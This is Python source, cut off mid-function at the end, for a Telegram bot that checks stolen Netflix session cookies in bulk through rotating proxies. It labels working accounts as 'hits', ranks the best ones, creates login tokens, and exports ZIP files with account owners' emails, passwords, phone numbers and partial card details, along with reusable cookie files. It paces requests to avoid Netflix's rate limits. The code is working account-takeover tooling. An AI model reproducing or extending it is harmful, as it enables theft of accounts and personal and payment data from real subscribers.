async def proxy_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle inline buttons from the proxy management panel."""
    query = update.callback_query
    uid = query.from_user.id if query.from_user else 0
    if not is_admin(uid):
        await query.answer("⛔ Admin only.", show_alert=True)
        return
    await query.answer()

    from proxy_manager import proxy_manager as pm
    action = query.data

    if action == "proxy:toggle":
        pm.toggle()

    elif action == "proxy:add":
        _PROXY_ADD_STATE.add(uid)
        await query.message.reply_text(
            "📝 <b>Send a proxy line to add:</b>\n\n"
            "Any of these formats work:\n"
            "  • <code>host:port</code>\n"
            "  • <code>host:port:user:pass</code>  ← Webshare format\n"
            "  • <code>user:pass@host:port</code>\n"
            "  • <code>http://user:pass@host:port</code>\n"
            "  • <code>socks5://host:port</code>\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "proxy:importurl":
        _PROXY_SOURCE_STATE.add(uid)
        await query.message.reply_text(
            "🌐 <b>Send the URL to import proxies from:</b>\n\n"
            "Examples:\n"
            "  • Webshare download link\n"
            "  • Any plain-text proxy list URL\n"
            "    (one proxy per line, any format)\n\n"
            "The URL will be saved and can be re-fetched anytime.\n\n"
            "Send /cancel to abort.",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action == "proxy:refreshsources":
        sources = pm.list_sources()
        if not sources:
            await query.answer("No sources saved yet.", show_alert=True)
            return
        await query.message.reply_text("⏳ Fetching proxies from saved sources…")
        added, skipped, errors = pm.refresh_all_sources()
        err_text = ("\n⚠️ Errors:\n" + "\n".join(errors)) if errors else ""
        await query.message.reply_text(
            f"✅ <b>Re-fetch complete</b>\n\n"
            f"➕ Added: {added}\n"
            f"⏭ Skipped/duplicate: {skipped}"
            f"{err_text}",
            parse_mode=ParseMode.HTML,
        )

    elif action == "proxy:downloadlist":
        proxies = pm.list_proxies()
        if not proxies:
            await query.answer("No proxies stored.", show_alert=True)
            return
        content = "\n".join(proxies).encode("utf-8")
        await query.message.reply_document(
            document=io.BytesIO(content),
            filename="proxies.txt",
            caption=f"📄 <b>{len(proxies)} proxies</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    elif action.startswith("proxy:remove:"):
        try:
            idx = int(action.split(":")[2])
        except (ValueError, IndexError):
            return
        removed = pm.remove_proxy(idx)
        if removed is None:
            await query.answer("Proxy not found.", show_alert=True)
            return

    elif action.startswith("proxy:delsource:"):
        try:
            idx = int(action.split(":")[2])
        except (ValueError, IndexError):
            return
        pm.remove_source(idx)

    elif action == "proxy:clear":
        pm.clear_proxies()

    elif action == "proxy:togglechangepw":
        new_val = pm.toggle_changepw_proxy()
        state = "ON ✅" if new_val else "OFF 🔴"
        await query.answer(f"Password Change proxy: {state}", show_alert=False)

    elif action == "proxy:refresh":
        pass

    try:
        await query.message.edit_text(
            _proxy_panel_text(),
            parse_mode=ParseMode.HTML,
            reply_markup=_proxy_panel_markup(pm),
        )
    except Exception:
        pass


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uid = update.effective_user.id if update.effective_user else None
    if update.effective_user:
        stats_tracker.record_user(update.effective_user.id)

    text = update.message.text.strip()
    if not text:
        return

    # ── Change Password flow — intercept before the cookie check ──────────
    if uid and uid in _CHANGEPW_STATE:
        await _handle_changepw_input(update, uid, text)
        return

    # ── Admin: single proxy line input ────────────────────────────────────
    if uid and uid in _PROXY_ADD_STATE:
        _PROXY_ADD_STATE.discard(uid)
        from proxy_manager import proxy_manager as pm
        ok, result = pm.add_proxy_raw(text.strip())
        if ok:
            await update.message.reply_text(
                f"✅ Proxy added: <code>{result}</code>\n\nUse /proxy to manage the pool.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                f"❌ {result}\n\nUse /proxy to try again.",
                parse_mode=ParseMode.HTML,
            )
        return

    # ── Admin: import-from-URL input ───────────────────────────────────────
    if uid and uid in _PROXY_SOURCE_STATE:
        _PROXY_SOURCE_STATE.discard(uid)
        src_url = text.strip()
        from proxy_manager import proxy_manager as pm
        # Save the source URL first
        src_ok, src_msg = pm.add_source(src_url)
        if not src_ok:
            await update.message.reply_text(
                f"❌ {src_msg}",
                parse_mode=ParseMode.HTML,
            )
            return
        # Immediately fetch it
        await update.message.reply_text("⏳ Fetching proxies from URL…")
        added, skipped, err = pm.fetch_from_url(src_url)
        if err:
            await update.message.reply_text(
                f"⚠️ <b>Could not fetch:</b> {err}\n\n"
                f"Source URL saved anyway — use 🔄 Re-fetch Sources later.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(
                f"✅ <b>Import complete</b>\n\n"
                f"➕ Added: <b>{added}</b> proxies\n"
                f"⏭ Skipped/duplicate: {skipped}\n\n"
                f"Source URL saved. Use /proxy → 🔄 Re-fetch to refresh anytime.",
                parse_mode=ParseMode.HTML,
            )
        return

    if len(text) < 10 or text.startswith("/"):
        return

    # ── Netflix cookie validation ──────────────────────────────────────────
    ok, err_msg = _validate_cookie_text(text)
    if not ok:
        # Check if user sent something that looks like a command/question
        if len(text) < 80 and not any(c in text for c in ("\t", "=", ";")):
            await update.message.reply_text(
                "🤔 <b>Not sure what to do with that.</b>\n\n"
                "Send me a Netflix cookie file (<code>.txt</code>, <code>.json</code>, or <code>.zip</code>), "
                "or paste your cookie data directly.\n\n"
                "Use /help to see supported formats.",
                parse_mode=ParseMode.HTML,
            )
        else:
            await update.message.reply_text(err_msg, parse_mode=ParseMode.HTML)
        return

    # ── Concurrency guard ──────────────────────────────────────────────────
    if uid in _ACTIVE_USERS:
        await update.message.reply_text(
            "⏳ <b>You already have a check running.</b>\n"
            "Wait for it to finish or cancel it before starting a new one.",
            parse_mode=ParseMode.HTML,
        )
        return

    if uid:
        _ACTIVE_USERS[uid] = time.time()

    status_msg = await update.message.reply_text("⏳ Parsing cookie data…")
    try:
        await process_cookies(update, status_msg, text, source="pasted text")
    except Exception as e:
        logger.exception("Error processing pasted text from user %s", uid)
        try:
            await status_msg.edit_text(
                f"⚠️ <b>Processing error</b>\n<i>{type(e).__name__}: {e}</i>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass
    finally:
        if uid:
            _ACTIVE_USERS.pop(uid, None)


# ---------------------------------------------------------------------------
# Session watchdog — auto-clears stuck sessions every 60 s
# ---------------------------------------------------------------------------

async def _session_watchdog() -> None:
    """
    Background coroutine that runs for the lifetime of the bot.
    Every 60 s it scans _ACTIVE_USERS for sessions that started more than
    SESSION_TIMEOUT_SEC ago and removes them so users can start a new check.
    This handles crashes, network drops, and any code path that forgets to
    call _ACTIVE_USERS.pop().
    """
    _STORE_TTL = 3 * 3600  # purge HITS/NAV entries older than 3 hours
    while True:
        await asyncio.sleep(60)
        now = time.time()

        # ── Stuck session cleanup ─────────────────────────────────────────────
        stuck = [uid for uid, ts in list(_ACTIVE_USERS.items())
                 if now - ts > SESSION_TIMEOUT_SEC]
        for uid in stuck:
            _ACTIVE_USERS.pop(uid, None)
            _USER_SESSION.pop(uid, None)
            logger.warning("Watchdog: auto-cleared stuck session for uid=%s", uid)

        # ── Stale HITS_STORE / NAV_STORE / GEN_LINK_STORE purge ─────────────
        # Both stores key on session_id (message id = integer timestamp proxy).
        # We prune entries whose session_id is older than _STORE_TTL seconds by
        # comparing (now - session_id) — message IDs are epoch seconds on Telegram.
        try:
            stale_hits = [k for k in list(_HITS_STORE) if now - k > _STORE_TTL]
            for k in stale_hits:
                _HITS_STORE.pop(k, None)
        except Exception:
            pass
        try:
            stale_nav = []
            for k in list(_NAV_STORE):
                try:
                    sid = int(k.split(":")[0])
                    if now - sid > _STORE_TTL:
                        stale_nav.append(k)
                except Exception:
                    pass
            for k in stale_nav:
                _NAV_STORE.pop(k, None)
        except Exception:
            pass
        try:
            stale_gen = [k for k, v in list(_GEN_LINK_STORE.items())
                         if now - v.get("ts", 0) > _STORE_TTL]
            for k in stale_gen:
                _GEN_LINK_STORE.pop(k, None)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Login links — paginated navigation (no rate-limit issues)
# ---------------------------------------------------------------------------

def _nav_keyboard(nav_key: str, page: int, total: int, result: dict) -> InlineKeyboardMarkup:
    """
    Navigation keyboard for paginated login links.
    Row 1: ◀ Prev  |  N / Total  |  Next ▶
    Row 2: 🖥️ PC Login  📱 Phone Login  (only if NFToken available)
    """
    nft = result.get("nftoken")
    has_links = nft and nft.get("success")

    prev_btn = (
        InlineKeyboardButton("◀ Prev", callback_data=f"navlinks:{nav_key}:{page - 1}")
        if page > 0
        else InlineKeyboardButton("·", callback_data="noop")
    )
    counter_btn = InlineKeyboardButton(f"  {page + 1} / {total}  ", callback_data="noop")
    next_btn = (
        InlineKeyboardButton("Next ▶", callback_data=f"navlinks:{nav_key}:{page + 1}")
        if page < total - 1
        else InlineKeyboardButton("·", callback_data="noop")
    )
    rows = [[prev_btn, counter_btn, next_btn]]
    if has_links:
        rows.append([
            InlineKeyboardButton("🖥️ PC Login",    url=nft["pc_url"]),
            InlineKeyboardButton("📱 Phone Login", url=nft["mobile_url"]),
        ])
    return InlineKeyboardMarkup(rows)


async def loginlinks_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Triggered when user taps 'Login Links — All Hits' or 'Login Links — Premium Only'.
    Generates NFTokens for all relevant accounts in parallel, then sends a
    beautifully formatted ZIP file containing every account with its login URLs.
    """
    from checker import generate_nftoken

    query = update.callback_query
    await query.answer("⏳ Building login links ZIP…")

    try:
        _, link_type, session_key = query.data.split(":", 2)
        session_id = int(session_key)
    except Exception:
        await query.message.reply_text("⚠️ Session data not found. Please run a new check.")
        return

    entry = _HITS_STORE.get(session_id)
    if not entry:
        await query.message.reply_text("⚠️ Session expired or not found. Please run a new check.")
        return

    hits_list, uid = entry

    if link_type == "premium":
        hits = [
            (r, s, w) for r, s, w in hits_list
            if "premium" in (r.get("plan_name") or "").lower()
        ]
        label    = "Premium Only"
        emoji    = "🌟"
        zip_name = f"netflix_premium_login_{date.today().isoformat()}_{len(hits)}x.zip"
    else:
        hits  = hits_list
        label = "All Hits"
        emoji = "🔗"
        zip_name = f"netflix_all_login_{date.today().isoformat()}_{len(hits)}x.zip"

    if not hits:
        await query.message.reply_text(
            f"<b>{emoji} {label}</b>\n\n<i>No accounts in this category.</i>",
            parse_mode=ParseMode.HTML,
        )
        return

    prog_msg = await query.message.reply_text(
        f"⏳ <b>Generating login tokens for {len(hits)} account(s)…</b>\n"
        f"<i>Building your ZIP — this takes a moment.</i>",
        parse_mode=ParseMode.HTML,
    )

    loop = asyncio.get_running_loop()

    async def _gen_token(result: dict) -> None:
        nft = result.get("nftoken")
        if not nft or not nft.get("success"):
            nf_id = result.get("netflix_id")
            cookies = {"NetflixId": nf_id} if nf_id else {}
            nft = await loop.run_in_executor(_EXECUTOR, generate_nftoken, cookies)
            result["nftoken"] = nft

    token_results = await asyncio.gather(
        *[_gen_token(r) for r, _, _ in hits],
        return_exceptions=True,
    )
    for _tr in token_results:
        if isinstance(_tr, Exception):
            logger.warning("loginlinks_callback: token generation exception: %s", _tr)

    # ── Build the ZIP in memory ────────────────────────────────────────────
    exp = "9999999999"
    today_str = date.today().isoformat()

    def _fmt_block(i: int, result: dict, src: str) -> str:
        email   = result.get("email")       or f"account_{i}"
        name    = result.get("name")        or ""
        pwd     = result.get("password")    or ""
        phone   = result.get("phone")       or ""
        country = result.get("country")     or "Unknown"
        plan    = result.get("plan_name")   or "Unknown"
        quality = result.get("quality")     or "Unknown"
        streams = result.get("max_streams") or "?"
        price   = result.get("price")       or "Unknown"
        since   = result.get("member_since") or "Unknown"
        billing = result.get("next_billing") or "Unknown"
        payment = result.get("payment")     or "Unknown"
        ct      = result.get("card_type")   or ""
        cl4     = result.get("card_last4")  or ""
        cexp    = result.get("card_expiry") or ""
        profs   = ", ".join(result.get("profile_names") or [])
        ev      = "Yes" if result.get("email_verified") else "No" if result.get("email_verified") is False else "Unknown"
        ms      = result.get("membership_status") or ""
        nf_id   = result.get("netflix_id")  or ""
        nf_sec  = result.get("secure_netflix_id") or ""
        nf_vid  = result.get("nfvdid")      or ""
        num_ex  = result.get("num_extra_members") or 0
        nft     = result.get("nftoken")     or {}
        flag    = _flag(country)

        sep = "=" * 62
        lines = [
            sep,
            f"  ACCOUNT #{i}  |  {plan.upper()}",
            sep,
            f"  Email:           {email}",
        ]
        if pwd:
            lines.append(f"  Password:        {pwd}")
        if name:
            lines.append(f"  Name:            {name}")
        if phone:
            lines.append(f"  Phone:           {phone}")
        lines += [
            f"  Country:         {country} {flag}",
            f"  Plan:            {plan}",
            f"  Quality:         {quality}  |  {streams} screen(s)",
            f"  Price:           {price}",
            f"  Member Since:    {since}",
            f"  Next Billing:    {billing}",
            f"  Payment:         {payment}",
        ]
        if ct:
            card_str = ct
            if cl4:
                card_str += f" .... {cl4}"
            if cexp:
                card_str += f"  (exp {cexp})"
            lines.append(f"  Card:            {card_str}")
        lines += [
            f"  Extra Member:    {'Yes — ' + str(num_ex) + ' slot(s)' if num_ex > 0 else 'No'}",
            f"  Email Verified:  {ev}",
            f"  Membership:      {ms}",
        ]
        if profs:
            lines.append(f"  Profiles:        {profs}")
        lines.append(f"  Source:          {src}")

        # Login links
        lines.append("")
        if nft.get("success"):
            lines += [
                "  ── LOGIN LINKS ──────────────────────────────────────",
                f"  PC Login:   {nft.get('pc_url', '')}",
                f"  Mobile:     {nft.get('mobile_url', '')}",
            ]
            if nft.get("expires"):
                lines.append(f"  Expires:    {nft['expires']}")
        else:
            lines.append(f"  LOGIN LINKS: Unavailable — {nft.get('error', 'token generation failed')}")

        # Cookies
        lines += [
            "",
            "  ── COOKIES (Netscape) ───────────────────────────────",
        ]
        if nf_id:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tNetflixId\t{nf_id}")
        if nf_sec:
            lines.append(f"  .netflix.com\tTRUE\t/\tTRUE\t{exp}\tSecureNetflixId\t{nf_sec}")
        if nf_vid:
            lines.append(f"  .netflix.com\tTRUE\t/\tFALSE\t{exp}\tnfvdid\t{nf_vid}")
        lines.append("")
        return "\n".join(lines)

    buf = io.BytesIO()
    ok_count = sum(1 for r, _, _ in hits if (r.get("nftoken") or {}).get("success"))

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        # ── Main formatted file ────────────────────────────────────────────
        header_lines = [
            f"Netflix {label} — Login Links Export",
            f"Generated: {today_str}",
            f"Total Accounts: {len(hits)}  |  Login Links Generated: {ok_count}",
            "=" * 62,
            "",
        ]
        body = "\n".join(
            _fmt_block(i, r, s) for i, (r, s, _) in enumerate(hits, 1)
        )
        zf.writestr(f"_LOGIN_LINKS_{label.upper().replace(' ', '_')}.txt",
                    "\n".join(header_lines) + body)

        # ── Individual cookie files ────────────────────────────────────────
        for i, (result, src, _) in enumerate(hits, 1):
            nf_id  = result.get("netflix_id") or ""
            plan   = result.get("plan_name") or "unknown"
            email  = result.get("email") or f"account_{i}"
            safe   = re.sub(r'[^\w@._-]', '_', email)[:40]
            nft    = result.get("nftoken") or {}
            content = ["# Netscape HTTP Cookie File"]
            if nf_id:
                content.append(f".netflix.com\tTRUE\t/\tTRUE\t{exp}\tNetflixId\t{nf_id}")
            if nft.get("success"):
                content.append(f"# PC Login:     {nft.get('pc_url', '')}")
                content.append(f"# Mobile Login: {nft.get('mobile_url', '')}")
            folder = "premium/" if "premium" in plan.lower() else "hits/"
            zf.writestr(f"{folder}{i:02d}_{safe}_{plan}.txt", "\n".join(content))

    buf.seek(0)

    try:
        await prog_msg.delete()
    except Exception:
        pass

    try:
        await query.message.reply_document(
            document=buf,
            filename=zip_name,
            caption=(
                f"{emoji} <b>Login Links — {label}</b>\n\n"
                f"  📋 Accounts:      <b>{len(hits)}</b>\n"
                f"  🔑 Links generated: <b>{ok_count}</b> / {len(hits)}\n\n"
                f"  📄 <code>_LOGIN_LINKS_{label.upper().replace(' ', '_')}.txt</code>\n"
                f"      Full account cards + login URLs\n"
                f"  🗂️ <code>premium/</code> &amp; <code>hits/</code> folders\n"
                f"      Individual cookie files with login URL comments"
            ),
            parse_mode=ParseMode.HTML,
        )
    except Exception as _send_err:
        logger.exception("loginlinks_callback: failed to send ZIP")
        await query.message.reply_text(
            f"⚠️ <b>Could not send the ZIP.</b>\n<i>{type(_send_err).__name__}: {_send_err}</i>",
            parse_mode=ParseMode.HTML,
        )


async def navlinks_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Navigate ◀/▶ through paginated login link results.
    Edits the existing message in-place — no new messages, no rate limiting.
    callback_data format: navlinks:{session_id}:{link_type}:{page}
    """
    query = update.callback_query
    await query.answer()

    try:
        # "navlinks:123456:all:5" → parts = ["navlinks","123456","all","5"]
        parts = query.data.split(":")
        nav_key = f"{parts[1]}:{parts[2]}"
        page = int(parts[3])
    except Exception:
        return

    entry = _NAV_STORE.get(nav_key)
    if not entry:
        await query.answer("Session expired — run a new check.", show_alert=True)
        return

    hits = entry["hits"]
    uid  = entry["uid"]
    total = len(hits)

    if page < 0 or page >= total:
        return

    link_type = parts[2]
    header = "🌟 Login Links — Premium Only" if link_type == "premium" else "🔗 Login Links — All Hits"

    result, src, _ = hits[page]
    txt = format_result(result, page + 1, total, source=src, user_id=uid)
    kb = _nav_keyboard(nav_key, page, total, result)

    full_text = f"<b>{header}</b>  •  {total} account{'s' if total > 1 else ''}\n\n" + txt
    # Telegram hard limit is 4096 chars — truncate gracefully if needed
    if len(full_text) > 4090:
        full_text = full_text[:4087] + "…"
    try:
        await query.edit_message_text(
            full_text,
            parse_mode=ParseMode.HTML,
            reply_markup=kb,
        )
    except Exception as _nav_err:
        # Edit failed (e.g. message unchanged) — try sending a new one
        try:
            await query.message.reply_text(full_text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass


async def noop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """No-op handler for display-only inline buttons (page counter)."""
    await update.callback_query.answer()


async def gen_link_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    On-demand NFToken generator for single checks.
    Triggered when the account check returned before the NFToken fetch finished.
    Generates the token, then edits the original result card to add login buttons.
    """
    from checker import generate_nftoken

    query = update.callback_query
    await query.answer("⏳ Generating login link…")

    try:
        _, session_key = query.data.split(":", 1)
    except ValueError:
        await query.answer("Invalid request.", show_alert=True)
        return

    entry = _GEN_LINK_STORE.pop(session_key, None)
    if not entry:
        await query.answer("Session expired — run a new check to get fresh links.", show_alert=True)
        return

    result = entry["result"]
    nf_id  = result.get("netflix_id", "")
    if not nf_id:
        await query.answer("❌ No NetflixId found in result.", show_alert=True)
        return

    loop = asyncio.get_running_loop()
    try:
        nft = await loop.run_in_executor(
            _EXECUTOR, generate_nftoken, {"NetflixId": nf_id}
        )
        result["nftoken"] = nft
        if nft.get("success"):
            new_txt = format_result(
                result, entry["idx"], entry["total"],
                source=entry["src"], user_id=entry["uid"],
            )
            kb = _login_keyboard(result)
            await query.edit_message_text(new_txt, parse_mode=ParseMode.HTML, reply_markup=kb)
        else:
            # Put it back so the user can retry
            _GEN_LINK_STORE[session_key] = entry
            result["nftoken"] = {"success": False, "error": "generating…"}
            await query.answer(
                f"❌ Could not generate link: {nft.get('error', 'unknown error')}. Tap the button to retry.",
                show_alert=True,
            )
    except Exception as _e:
        _GEN_LINK_STORE[session_key] = entry
        await query.answer(f"❌ Error: {_e}", show_alert=True)


async def besthits_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Triggered when user taps 'Best Hits (N)'.
    Scores all hits, picks the top N best accounts, generates their NFTokens,
    and shows them in the paginated ◀/▶ navigator with login buttons.
    callback_data: besthits:{session_id}
    """
    from checker import generate_nftoken

    query = update.callback_query
    await query.answer("⏳ Finding best accounts…")

    prog_msg = None
    try:
        try:
            _, session_key = query.data.split(":", 1)
            session_id = int(session_key)
        except Exception:
            await query.message.reply_text("⚠️ Session data not found. Please run a new check.")
            return

        entry = _HITS_STORE.get(session_id)
        if not entry:
            await query.message.reply_text("⚠️ Session expired or not found. Please run a new check.")
            return

        hits_list, uid = entry

        # Score and pick top 5
        try:
            sorted_hits = sorted(hits_list, key=lambda x: _score_account(x[0]), reverse=True)
        except Exception:
            sorted_hits = hits_list[:]
        top_n = sorted_hits[:5]

        if not top_n:
            await query.message.reply_text("⚠️ No scoreable accounts found.")
            return

        prog_msg = await query.message.reply_text(
            f"⏳ <b>Scoring &amp; generating tokens for top {len(top_n)} account(s)…</b>",
            parse_mode=ParseMode.HTML,
        )

        loop = asyncio.get_running_loop()

        async def _gen_token(result: dict) -> None:
            try:
                nft = result.get("nftoken")
                if not nft or not nft.get("success"):
                    nf_id = result.get("netflix_id")
                    cookies = {"NetflixId": nf_id} if nf_id else {}
                    nft = await loop.run_in_executor(_EXECUTOR, generate_nftoken, cookies)
                    result["nftoken"] = nft
            except Exception as _e:
                result.setdefault("nftoken", {"success": False, "error": str(_e)})

        await asyncio.gather(
            *[_gen_token(r) for r, _, _ in top_n],
            return_exceptions=True,
        )

        try:
            await prog_msg.delete()
            prog_msg = None
        except Exception:
            pass

        # Store in nav store and show paginated view
        nav_key = f"{session_id}:best"
        _NAV_STORE[nav_key] = {"hits": top_n, "uid": uid}

        result, src, _ = top_n[0]
        txt = format_result(result, 1, len(top_n), source=src, user_id=uid)
        kb  = _nav_keyboard(nav_key, 0, len(top_n), result)

        full_text = (
            f"🏆 <b>Best Hits</b>  •  Top {len(top_n)} of {len(hits_list)} accounts\n"
            f"<i>Ranked: Plan tier → longest billing → oldest member</i>\n\n" + txt
        )
        if len(full_text) > 4090:
            full_text = full_text[:4087] + "…"

        await query.message.reply_text(
            full_text,
            parse_mode=ParseMode.HTML,
            reply_markup=kb,
        )

    except Exception as _e:
        logger.exception("besthits_callback crashed")
        if prog_msg:
            try:
                await prog_msg.delete()
            except Exception:
                pass
        try:
            await query.message.reply_text(
                f"⚠️ <b>Best Hits failed.</b>\n<i>{type(_e).__name__}: {_e}</i>\n\nPlease try again.",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass


# ---------------------------------------------------------------------------
# Core processing
# ---------------------------------------------------------------------------

async def process_cookies(
    update: Update, status_msg, cookie_text: str, source: str = ""
) -> None:
    sets = split_cookies_from_text(cookie_text)

    if not sets:
        await status_msg.edit_text("⚠️ No cookie data found.")
        return

    if len(sets) == 1:
        from checker import auto_parse_cookies
        c = auto_parse_cookies(sets[0])
        keys = [k for k in c if k in ("NetflixId", "SecureNetflixId", "nfvdid", "gsid")]
        await status_msg.edit_text(
            f"🍪 <b>Detected:</b> 1 account — {len(c)} cookies "
            f"({', '.join(keys) or '…'})\n🔍 Checking…",
            parse_mode=ParseMode.HTML,
        )
    else:
        await status_msg.edit_text(
            f"🍪 <b>Detected:</b> {len(sets)} accounts\n🔍 Starting bulk check…",
            parse_mode=ParseMode.HTML,
        )

    tuples = [(source or f"account_{i}", s, s) for i, s in enumerate(sets, 1)]
    await process_cookie_sets(update, status_msg, tuples)


async def process_cookie_sets(
    update: Update,
    status_msg,
    cookie_sets: list[tuple[str, str, str]],
) -> None:
    loop = asyncio.get_running_loop()
    total = len(cookie_sets)
    is_bulk = total > 1

    if total == 0:
        await status_msg.edit_text("⚠️ No cookie data found.")
        return

    uid = update.effective_user.id if update.effective_user else 0
    hits_list: list[tuple[dict, str, str]] = []
    hits = frees = invalids = errors = on_hold = 0
    t_start = time.monotonic()
    session_id = status_msg.message_id
    # Register this session so /cancel can find it mid-run
    if uid:
        _USER_SESSION[uid] = session_id
    error_retry: list[tuple[str, str, str]] = []   # collect errored accounts for one retry

    for batch_start in range(0, total, BULK_CONCURRENCY):
        if session_id in _CANCEL_SESSIONS:
            _CANCEL_SESSIONS.discard(session_id)
            elapsed = time.monotonic() - t_start
            mins, secs = divmod(int(elapsed), 60)
            time_str = f"{mins}m {secs}s" if mins else f"{secs}s"
            try:
                await status_msg.edit_text(
                    f"🛑 <b>Cancelled</b>\n\n"
                    f"{make_progress_bar(batch_start, total)}  {batch_start}/{total}\n\n"
                    f"✅ {hits}  ❌ {invalids}  ⏸️ {on_hold}  🔓 {frees}  ⚠️ {errors}\n\n"
                    f"⏱️ {time_str}",
                    parse_mode=ParseMode.HTML,
                )
            except Exception:
                pass
            if hits_list:
                await update.message.reply_text(
                    f"📊 <b>Cancelled — Partial Summary</b>\n\n"
                    f"  ✅  Hits (Active)   »  <b>{hits}</b>\n"
                    f"  ⏸️  On Hold         »  <b>{on_hold}</b>\n"
                    f"  🔓  Free (No Sub)   »  <b>{frees}</b>\n"
                    f"  ❌  Invalid         »  <b>{invalids}</b>\n"
                    f"  ⚠️  Errors          »  <b>{errors}</b>\n\n"
                    f"  📦  Checked so far  »  <b>{batch_start}</b> / {total}",
                    parse_mode=ParseMode.HTML,
                )
                await send_hits_zip(update, hits_list)
            return

        batch = cookie_sets[batch_start: batch_start + BULK_CONCURRENCY]

        if is_bulk:
            done_so_far = batch_start
            elapsed = time.monotonic() - t_start
            speed = done_so_far / elapsed * 60 if elapsed > 1 and done_so_far > 0 else 0
            speed_str = f"🚀 {speed:.1f} acc/min" if speed > 0 else "🕐 Starting…"
            try:
                await status_msg.edit_text(
                    f"⚡ <b>Bulk Check in Progress</b>\n\n"
                    f"{make_progress_bar(done_so_far, total)}  {done_so_far}/{total}\n\n"
                    f"✅ {hits}  ❌ {invalids}  ⏸️ {on_hold}  🔓 {frees}  ⚠️ {errors}\n\n"
                    f"{speed_str}",
                    parse_mode=ParseMode.HTML,
                    reply_markup=_cancel_keyboard(session_id),
                )
            except Exception:
                pass

        batch_results = await asyncio.gather(*[
            loop.run_in_executor(
                _EXECUTOR,
                functools.partial(check_cookie, generate_token=not is_bulk, bulk_mode=is_bulk),
                cs,
            )
            for _src, cs, _raw in batch
        ], return_exceptions=True)

        for (src, cs, raw), result in zip(batch, batch_results):
            if isinstance(result, Exception):
                result = {"status": "error", "message": str(result)}

            status = result.get("status", "error")
            idx    = batch_start + batch.index((src, cs, raw)) + 1

            if status == "hit":
                hits += 1
                hits_list.append((result, src, raw))
            elif status == "free":
                frees += 1
            elif status == "on_hold":
                on_hold += 1
                hits_list.append((result, src, raw))
            elif status == "invalid":
                invalids += 1
            else:
                # Don't count as error yet — queue for one retry at the end
                if is_bulk:
                    error_retry.append((src, cs, raw))
                else:
                    errors += 1

            user_id = update.effective_user.id if update.effective_user else 0
            stats_tracker.record_check(status, user_id=user_id, source=src)
            if status in ("hit", "free", "on_hold"):
                mongodb_store.save_hit(result, user_id=user_id, source=src)
            result["_source"] = src

            # Single-check: always show full card.
            # Bulk: no individual cards — results sent at the end as login links.
            if not is_bulk:
                txt = format_result(result, idx, total, source=src, user_id=uid)
                kb  = _login_keyboard(result)
                # NFToken missed its grace window — offer on-demand generation
                if kb is None and status in ("hit", "on_hold"):
                    _GEN_LINK_STORE[str(session_id)] = {
                        "result": result, "idx": idx, "total": total,
                        "src": src, "uid": uid, "ts": time.time(),
                    }
                    kb = InlineKeyboardMarkup([[
                        InlineKeyboardButton("🔑 Get Login Link", callback_data=f"genlink:{session_id}"),
                    ]])
                try:
                    await update.message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb)
                except Exception:
                    pass

        if is_bulk:
            # Brief inter-batch pause reduces Netflix IP-level rate limiting.
            await asyncio.sleep(0.15)

    # ── Retry errored accounts once (full timeout, not bulk-mode) ─────────────
    if is_bulk and error_retry:
        try:
            await status_msg.edit_text(
                f"♻️ <b>Retrying {len(error_retry)} timed-out account(s)…</b>",
                parse_mode=ParseMode.HTML,
            )
        except Exception:
            pass

        # Retry with bulk settings (8s timeout, no retries) so this pass is fast.
        # If they still fail they become invalid — not error.
        retry_results = await asyncio.gather(*[
            loop.run_in_executor(
                _EXECUTOR,
                functools.partial(check_cookie, generate_token=False, bulk_mode=True),
                cs,
            )
            for _src, cs, _raw in error_retry
        ], return_exceptions=True)

        for (src, cs, raw), result in zip(error_retry, retry_results):
            if isinstance(result, Exception):
                result = {"status": "invalid", "message": "Timeout after retry"}
            status = result.get("status", "invalid")
            if status == "hit":
                hits += 1
                hits_list.append((result, src, raw))
            elif status == "free":
                frees += 1
            elif status == "on_hold":
                on_hold += 1
                hits_list.append((result, src, raw))
            else:
                invalids += 1   # error after retry → count as invalid, not error
            stats_tracker.record_check(status, user_id=uid, source=src)
            result["_source"] = src

    elapsed = time.monotonic() - t_start
    speed   = total / elapsed * 60 if elapsed > 0 else 0
    mins, secs = divmod(int(elapsed), 60)
    time_str = f"{mins}m {secs}s" if mins else f"{secs}s"

    _CANCEL_SESSIONS.discard(session_id)
    _USER_SESSION.pop(uid, None)

    # ── Deduplicate hits_list before all counts / storage / ZIP ───────────────
    # hits_list is raw (may contain the same NetflixId from duplicate input cookies).
    # Without dedup the premium count in the summary card and the button label
    # are inflated vs what the ZIP actually contains.
    if is_bulk and hits_list:
        _seen_keys: set[str] = set()
        _deduped: list[tuple[dict, str, str]] = []
        for _item in hits_list:
            _nf_id = _item[0].get("netflix_id") or ""
            _key   = _nf_id  # full value — unique per account, no splitting
            if _key and _key in _seen_keys:
                continue
            if _key:
                _seen_keys.add(_key)
            _deduped.append(_item)
        if len(_deduped) < len(hits_list):
            # Recalculate per-status counters from deduped list
            hits    = sum(1 for r, _, _ in _deduped if r.get("status") == "hit")
            on_hold = sum(1 for r, _, _ in _deduped if r.get("status") == "on_hold")
        hits_list = _deduped

    if is_bulk:
        premium_count = sum(1 for r, _, _ in hits_list if "premium" in (r.get("plan_name") or "").lower())
        try:
            await status_msg.edit_text(
                f"✅ <b>Done!</b>  {make_progress_bar(total, total)}  {total}/{total}\n\n"
                f"⏱️ {time_str}  ·  🚀 {speed:.1f} acc/min",
